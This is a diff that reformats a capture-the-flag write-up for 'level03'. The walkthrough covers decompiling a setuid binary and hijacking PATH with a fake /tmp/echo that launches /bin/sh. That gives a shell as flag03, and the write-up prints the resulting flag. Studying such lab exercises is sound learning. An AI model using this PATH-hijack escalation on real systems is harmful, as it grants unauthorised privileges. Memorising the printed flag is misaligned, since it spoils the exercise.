@@ -9,38 +9,74 @@ It is possible to run almost any executable with elevated privileges in this exe
 
 in kali: scp executable from target machine
 
-in kali: ```/opt/retdec/bin/retdec-decompiler.py level03```
+in kali:
+
+```shell
+/opt/retdec/bin/retdec-decompiler.py level03
+```
 
 OPTION 1:
 
- ```PATH=/tmp:$PATH```
+ ```shell
+ PATH=/tmp:$PATH
+ ```
 
- ```echo /bin/sh > /tmp/echo```
+ ```shell
+ echo /bin/sh > /tmp/echo
+ ```
 
- ```chmod +x /tmp/echo```
+ ```shell
+ chmod +x /tmp/echo
+ ```
 
- ```./level03```
+ ```shell
+ ./level03
+ ```
 
- Optional (proof that we operate as flag03): ```whoami```
+ Optional (proof that we operate as flag03):
 
- ```getflag```
+ ```shell
+ whoami
+ ```
+
+ ```shell
+ getflag
+ ```
 
  gives: qi0maab88jeaj46qoumi7maus
 
 OPTION 2:
 
- ```cd /tmp```
+ ```shell
+ cd /tmp
+ ```
 
- ```vim main.c```
+ ```shell
+ vim main.c
+ ```
 
  Copy-Paste exploit.c
 
- ```gcc main.c -o echo```
+ ```shell
+ gcc main.c -o echo
+ ```
 
- ```~/level03```
+ ```shell
+ ~/level03
+ ```
 
- Optional (proof that we operate as flag03): ```whoami```
+ Optional (proof that we operate as flag03):
 
- ```getflag```
+ ```shell
+ whoami
+ ```
 
- gives: qi0maab88jeaj46qoumi7maus
+ ```shell
+ getflag
+ ```
+
+ gives flag:
+
+ ```shell
+ qi0maab88jeaj46qoumi7maus
+ ```
